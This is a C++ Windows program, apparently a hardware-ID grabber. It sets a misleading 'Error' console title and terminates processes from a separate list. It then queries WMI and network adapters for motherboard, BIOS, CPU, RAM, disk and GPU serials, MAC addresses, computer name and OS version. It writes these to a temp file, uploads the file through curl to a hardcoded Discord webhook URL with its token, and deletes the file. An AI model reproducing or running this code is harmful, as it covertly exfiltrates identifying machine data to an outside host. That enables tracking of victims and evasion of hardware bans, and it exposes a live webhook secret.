#include <iostream>
#include <fstream>
#include <Windows.h>
#include <Wbemidl.h>
#include <comutil.h>
#include <iphlpapi.h>
#include "processlist.h"

#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "iphlpapi.lib")

int main() {
    const wchar_t* newTitle = L"Error";
    SetConsoleTitle(newTitle);

    ProcessList::TerminateProcesses();

    const std::wstring webhookUrl = L"https://canary.discord.com/api/webhooks/1197270625337741474/k5_T7_k2ukPGefroP7FTDwK9usVqMLYXY9Owntkmdkeyp8mFSUezR_EsnCe7trtA-ks0";

    // File path
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        return 1;
    }

    std::wstring filePath = tempPath;
    filePath += L"\\1337.txt";

    // Create and open the file
    std::wofstream file(filePath);
    if (!file.is_open()) {
        return 1;
    }

    // Initialize COM objects required for WMI
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    if (CoInitializeEx(0, COINIT_MULTITHREADED) != S_OK) {
        return 1;
    }

    if (CoCreateInstance(__uuidof(WbemLocator), 0, CLSCTX_INPROC_SERVER, __uuidof(IWbemLocator), (LPVOID*)&pLoc) != S_OK) {
        CoUninitialize();
        return 1;
    }

    if (pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMv2"), nullptr, nullptr, 0, NULL, 0, 0, &pSvc) != S_OK) {
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) != S_OK) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    // Get motherboard information
    IEnumWbemClassObject* pEnumerator = nullptr;
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_BaseBoard"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring motherboardSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!motherboardSerialNumber.empty()) {
                    file << L"Motherboard Serial Number: " << motherboardSerialNumber << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get BIOS information
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_BIOS"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring biosSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!biosSerialNumber.empty()) {
                    file << L"BIOS Serial Number: " << biosSerialNumber << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get MAC address
    IP_ADAPTER_INFO adapterInfo[16];
    ULONG adapterInfoSize = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        while (pAdapterInfo) {
            file << L"MAC Address: " << pAdapterInfo->Address << std::endl;
            pAdapterInfo = pAdapterInfo->Next;
        }
    }

    // Get CPU serial number
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT ProcessorId FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"ProcessorId", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring processorId = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!processorId.empty()) {
                    file << L"CPU ProcessorId: " << processorId << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get RAM serials
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_PhysicalMemory"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring ramSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!ramSerialNumber.empty()) {
                    file << L"RAM Serial Number: " << ramSerialNumber << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get GPU Serials
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_VideoController"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"PNPDeviceID", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring gpuSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!gpuSerialNumber.empty()) {
                    file << L"GPU Serial Number: " << gpuSerialNumber << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get serials of disk drives
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_DiskDrive"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring diskSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!diskSerialNumber.empty()) {
                    file << L"Disk Serial Number: " << diskSerialNumber << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get serials of sound cards
   if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_SoundDevice"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
       while (pEnumerator) {
           IWbemClassObject* pclsObj = nullptr;
           ULONG uReturn = 0;
           if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
               break;

           VARIANT vtProp;
           if (pclsObj->Get(L"PNPDeviceID", 0, &vtProp, 0, 0) == S_OK) {
               std::wstring soundDeviceSerial = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
               if (!soundDeviceSerial.empty()) {
                   file << L"Sound Device Serial: " << soundDeviceSerial << std::endl;
               }
               VariantClear(&vtProp);
           }

            pclsObj->Release();
        }
    }

   // Get serials of USB devices

   /*
  if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_USBControllerDevice"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
      while (pEnumerator) {
          IWbemClassObject* pclsObj = nullptr;
          ULONG uReturn = 0;
          if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
               break;

           VARIANT vtProp;
           if (pclsObj->Get(L"Dependent", 0, &vtProp, 0, 0) == S_OK) {
               std::wstring usbDeviceSerial = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
               if (!usbDeviceSerial.empty()) {
                   file << L"USB Device Serial: " << usbDeviceSerial << std::endl;
               }
              VariantClear(&vtProp);
           }

          pclsObj->Release();
       }
   }
   */

   // Get PC Name
   if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_ComputerSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
       while (pEnumerator) {
           IWbemClassObject* pclsObj = nullptr;
           ULONG uReturn = 0;
           if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
               break;

           VARIANT vtProp;
           if (pclsObj->Get(L"Name", 0, &vtProp, 0, 0) == S_OK) {
               std::wstring computerName = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
               if (!computerName.empty()) {
                   file << L"Computer Name: " << computerName << std::endl;
               }
               VariantClear(&vtProp);
           }

           pclsObj->Release();
       }
   }

   // Get SMBIOS Manufacturer information
   if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_SystemEnclosure"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
       while (pEnumerator) {
           IWbemClassObject* pclsObj = nullptr;
           ULONG uReturn = 0;
           if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
               break;

           VARIANT vtProp;

           // SMBIOS Manufacturer
           if (pclsObj->Get(L"Manufacturer", 0, &vtProp, 0, 0) == S_OK) {
               std::wstring smbiosManufacturer = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
               if (!smbiosManufacturer.empty()) {
                   file << L"SMBIOS Manufacturer: " << smbiosManufacturer << std::endl;
               }
               VariantClear(&vtProp);
           }

           pclsObj->Release();
       }
   }


    // Get GPU information
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_DisplayConfiguration"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"Description", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring gpuDescription = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!gpuDescription.empty()) {
                    file << L"GPU Description: " << gpuDescription << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Windows Version
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_OperatingSystem"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"Version", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring windowsVersion = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!windowsVersion.empty()) {
                    file << L"Windows Version: " << windowsVersion << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Get CPU Brand and Model Information
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_Processor"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"Caption", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring cpuCaption = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!cpuCaption.empty()) {
                    file << L"CPU Caption: " << cpuCaption << std::endl;
                }
                VariantClear(&vtProp);
            }

            if (pclsObj->Get(L"Manufacturer", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring cpuManufacturer = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!cpuManufacturer.empty()) {
                    file << L"CPU Manufacturer: " << cpuManufacturer << std::endl;
                }
                VariantClear(&vtProp);
            }

            if (pclsObj->Get(L"Name", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring cpuName = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                if (!cpuName.empty()) {
                    file << L"CPU Name: " << cpuName << std::endl;
                }
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }
    // Cleanup
    pEnumerator->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    // Close File
    file.close();

    // Create and run the curl command
    std::wstring curlCommand = L"curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@" + filePath + L"\" " + webhookUrl + L" > NUL";
    _wsystem(curlCommand.c_str());

    // Delete File
    if (DeleteFileW(filePath.c_str()) == 0) {
        return 1;
    }

    return 0;  // Thats it
}
